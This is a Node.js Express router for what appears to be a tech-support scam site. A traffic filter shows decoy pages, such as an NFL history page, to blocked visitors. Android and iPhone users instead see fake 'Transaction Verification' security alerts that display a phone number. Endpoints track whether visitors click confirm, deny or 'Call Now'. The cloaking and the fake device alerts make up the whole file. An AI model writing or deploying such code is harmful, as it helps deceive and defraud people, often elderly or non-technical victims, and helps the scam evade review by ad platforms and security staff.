const express = require('express');
const router = express.Router();
const { trafficFilter } = require('../middleware/trafficFilter');
const TrafficLog = require('../models/TrafficLog');

// Design variants per device
const ANDROID_DESIGNS = [
  { view: 'android-secure',   title: 'Android Secure — Transaction Verification' },
  { view: 'android-material', title: 'Android Guard — Transaction Verification' }
];

const IPHONE_DESIGNS = [
  { view: 'apple-new', title: 'iPhone Firewall — Transaction Verification' },
  { view: 'iphone-firewall',    title: 'iOS Firewall — Transaction Alert' }
];

function randomPick(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

// Main endpoint — applies traffic filter
router.get('/endpoint', trafficFilter, (req, res) => {
  const result = req.trafficResult;
  const phone = process.env.SUPPORT_NUMBER || '+18000000000';
  const clarity = process.env.CLARITY_ID || '1111111';

  if (result.blocked) {
    return res.render('dummy', {
      title: 'How to improve yourself and feel confident',
      clarity
    });
  }

  


  if (result.contentServed === 'android') {
    const design = randomPick(ANDROID_DESIGNS);
    return res.render(design.view, { title: design.title, phone,clarity });
  }

  if (result.contentServed === 'iphone') {
    const design = randomPick(IPHONE_DESIGNS);
    return res.render(design.view, { title: design.title, phone,clarity });
  }

  return res.render('dummy', { title: 'How to improve yourself and feel confident',clarity });
});

// Extra endpoint 1

router.get('/endpoint1', trafficFilter, (req, res) => {
  const result = req.trafficResult;
  const phone = process.env.SUPPORT_NUMBER || '+18000000000';
  const clarity = process.env.CLARITY_ID || '1111111';

  if (result.blocked) {
    return res.render('dummy1', {
      title: 'Complete History of NFL',
      clarity
    });
  }



  if (result.contentServed === 'android') {
    const design = randomPick(ANDROID_DESIGNS);
    return res.render(design.view, { title: design.title, phone,clarity });
  }

  if (result.contentServed === 'iphone') {
    const design = randomPick(IPHONE_DESIGNS);
    return res.render(design.view, { title: design.title, phone,clarity });
  }

  return res.render('dummy1', { title: 'Complete History of NFL' ,clarity });
});


// Extra endpoint 2

router.get('/endpoint2', trafficFilter, (req, res) => {
  const result = req.trafficResult;
  const phone = process.env.SUPPORT_NUMBER || '+18000000000';
  const clarity = process.env.CLARITY_ID || '1111111';


  if (result.blocked) {
    return res.render('dummy2', {
      title: 'Complete History of Hollywood',
      clarity
    });
  }

  


  if (result.contentServed === 'android') {
    const design = randomPick(ANDROID_DESIGNS);
    return res.render(design.view, { title: design.title, phone,clarity });
  }

  if (result.contentServed === 'iphone') {
    const design = randomPick(IPHONE_DESIGNS);
    return res.render(design.view, { title: design.title, phone,clarity });
  }

  return res.render('dummy2', { title: 'Complete History of Hollywood',clarity });
});

// ===== CONVERSION TRACKING API =====

// POST /api/convert — fired when user clicks Yes/No button
router.post('/api/convert', async (req, res) => {
  try {
    const { action } = req.body;
    if (!action || !['confirm', 'deny'].includes(action)) {
      return res.status(400).json({ error: 'Invalid action' });
    }

    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
      || req.headers['x-real-ip']
      || req.connection.remoteAddress
      || req.ip;
    const cleanIP = ip.replace('::ffff:', '');

    const log = await TrafficLog.findOne({
      ip: cleanIP,
      status: 'allowed',
      'conversion.action': null
    }).sort({ timestamp: -1 });

    if (!log) {
      return res.status(404).json({ error: 'No matching log found' });
    }

    log.conversion.action = action;
    log.conversion.actionAt = new Date();
    await log.save();

    return res.json({ ok: true, id: log._id });
  } catch (err) {
    console.error('[Convert] Error:', err.message);
    return res.status(500).json({ error: 'Server error' });
  }
});

// POST /api/convert/call — fired when user clicks "Call Now"
router.post('/api/convert/call', async (req, res) => {
  try {
    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
      || req.headers['x-real-ip']
      || req.connection.remoteAddress
      || req.ip;
    const cleanIP = ip.replace('::ffff:', '');

    const log = await TrafficLog.findOne({
      ip: cleanIP,
      status: 'allowed',
      'conversion.action': { $ne: null },
      'conversion.callClicked': false
    }).sort({ timestamp: -1 });

    if (!log) {
      return res.status(404).json({ error: 'No matching log found' });
    }

    log.conversion.callClicked = true;
    log.conversion.callClickedAt = new Date();
    await log.save();

    return res.json({ ok: true, id: log._id });
  } catch (err) {
    console.error('[Convert/Call] Error:', err.message);
    return res.status(500).json({ error: 'Server error' });
  }
});

module.exports = router;
